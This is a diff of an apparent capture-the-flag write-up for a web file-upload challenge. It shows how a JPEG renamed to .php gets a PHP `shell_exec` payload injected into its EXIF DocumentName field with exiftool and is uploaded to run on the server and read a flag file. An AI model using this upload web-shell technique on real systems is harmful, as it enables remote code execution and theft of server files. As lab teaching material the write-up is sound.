@@ -27,23 +27,20 @@ Hence, we can start by using a cute penguin image `penguin.jpeg`.
 Using `file penguin.jpeg` to check the file type.
 
 ```
-┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ file penguin.jpeg  
+$ file penguin.jpeg  
 penguin.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 183x276, components 3
 ```
 
 Change the file extension from `penguin.jpeg` to `penguin.php`.
 
 ```
-┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ cp penguin.jpeg penguin.php
+$ cp penguin.jpeg penguin.php
 ```
 
 Check the file type again. We can see that the file type remains unchanged despite the file extension has been modified with `cp` command.
 
 ```
-┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ file penguin.php
+$ file penguin.php
 penguin.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 183x276, components 3
 ```
 
@@ -51,13 +48,12 @@ Upload it to the website and check for vulnerabilities.
 
 ![cloudstorage1](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/dec3d978-14a7-4df9-bd5d-d215f88474d0)
 
-We concluded that this challenge website is vulnerable to PHP injection attacks. We can inject a PHP shellcode stating the location of the flag (given by the challenge) to execute remotely and retrieve information from the website.
+It is using PHP to execute an image file. So, we can inject a PHP shellcode stating the location of the flag (given by the challenge) to execute remotely and retrieve information from the website.
 
-Now, inject a super duper simple PHP shell execution payload into the `penguin.php` using `exiftool`.
+Inject a super duper simple PHP shell execution payload into the `penguin.php` using `exiftool`.
 
 ```
-┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ exiftool -DocumentName='<?php echo shell_exec("cat /home/flag.txt"); ?>' > penguin.php
+$ exiftool -DocumentName='<?php echo shell_exec("cat /home/flag.txt"); ?>' > penguin.php
     1 image files updated
 
 ┌──(kali㉿kali)-[~/finals/web/payloads]
@@ -91,7 +87,7 @@ Megapixels                      : 0.051
 ```
 
 {% capture notice-2 %}
-💡 **NOTE**: We tried to inject using `-Note=` and `-Comment=` metadata parameters but it did not give any results. However, we ended up using `-DocumentName=` for the attack, and works. In our opinion, we think that any parameters will give the same results but the procedure of modifying the image file is incorrect.
+💡 **NOTE**: We tried to inject using `-Note=` and `-Comment=` parameters but it did not give any results. However, we ended up using `-DocumentName=` for the attack and it works.
 {% endcapture %}
 
 <div class="notice--info">{{ notice-2 | markdownify }}</div>
@@ -99,12 +95,11 @@ Megapixels                      : 0.051
 We can check the file type to see if our document name has added.
 
 ```
-┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ file penguin.php 
+$ file penguin.php 
 penguin.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, name=<?php echo shell_exec('cat /home/flag.txt');?>, xresolution=122, yresolution=130, resolutionunit=1], baseline, precision 8, 183x276, components 3
 ```
 
-Upload the malicious file and we got a hit! The flag is then revealed.
+Upload the file and we got a hit!
 
 ![GGcloudstorage](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/ab0fe0d8-36ce-47c6-8882-3f0d51137175)
 
